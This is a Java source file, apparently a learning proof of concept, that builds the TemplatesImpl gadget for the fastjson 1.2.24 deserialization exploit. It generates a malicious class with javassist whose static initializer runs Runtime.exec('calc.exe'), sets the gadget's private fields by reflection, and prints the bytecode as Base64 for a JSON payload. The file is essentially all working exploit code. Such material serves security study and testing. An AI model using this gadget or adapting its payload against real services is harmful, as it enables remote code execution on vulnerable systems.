package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.SerializerFeature;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.Base64;

public class FastJson_TemplatesImpl {

    public static void main(String[] args) throws Exception {
        //构造一个templatesImpl对象
        TemplatesImpl templates = new TemplatesImpl();
        byte[] bytes = generateEvilClass();
        setFieldValue(templates, "_name", "EvilClass");
        setFieldValue(templates, "_bytecodes", new byte[][] {bytes});
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
//        System.out.println(Base64.getEncoder().encodeToString(bytes));
//        templates.newTransformer();
        //将templatesImpl对象序列化为json数据
        //由于1.2.24版本的fastjson不支持SerializerFeature.WriteNonPublicFeature属性，且 _name, _bytecodes, _tfactory均无getter方法，所以需要手动构造json数据
//        String jsonString = JSON.toJSONString(templates,SerializerFeature.WriteNonPublicFeature);
//        System.out.println(jsonString);
    }
    /**
     * 生成包含恶意静态代码块的类字节码
     */
    private static byte[] generateEvilClass() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("EvilTranslet");

        // 关键点：必须继承 AbstractTranslet，否则 TemplatesImpl 无法加载
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));

        // 添加静态代码块（类初始化时触发恶意逻辑）
        ctClass.makeClassInitializer().insertBefore(
                "java.lang.Runtime.getRuntime().exec(\"calc.exe\");"
        );

        // 添加默认构造函数（AbstractTranslet 的父类要求）
        CtConstructor constructor = new CtConstructor(new CtClass[0], ctClass);
        constructor.setBody("{}");
        ctClass.addConstructor(constructor);
        System.out.println(Base64.getEncoder().encodeToString(ctClass.toBytecode()));
        // 生成字节码
        return ctClass.toBytecode();
    }
    // 反射工具方法
    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }




}
